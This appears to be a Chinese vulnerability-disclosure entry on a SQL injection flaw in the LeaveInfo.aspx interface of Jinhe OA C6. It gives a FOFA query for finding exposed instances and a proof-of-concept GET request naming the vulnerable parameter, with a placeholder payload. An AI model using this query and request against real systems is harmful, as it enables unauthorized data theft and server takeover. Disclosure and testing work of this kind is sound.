## 金和OA-LeaveInfo.aspx-SQL注入漏洞

## 一、漏洞简介
金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 LeaveInfo.aspx 接口处存在SQL注入漏洞，攻击者除了可以利用SQL注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa
```
app="金和网络-金和OA"
```

## POC
```
GET /c6/Jhsoft.Web.dossier/LeaveInfo.aspx/?UserID=SQLI_POC&gettype=getstation HTTP/1.1
Host:
```
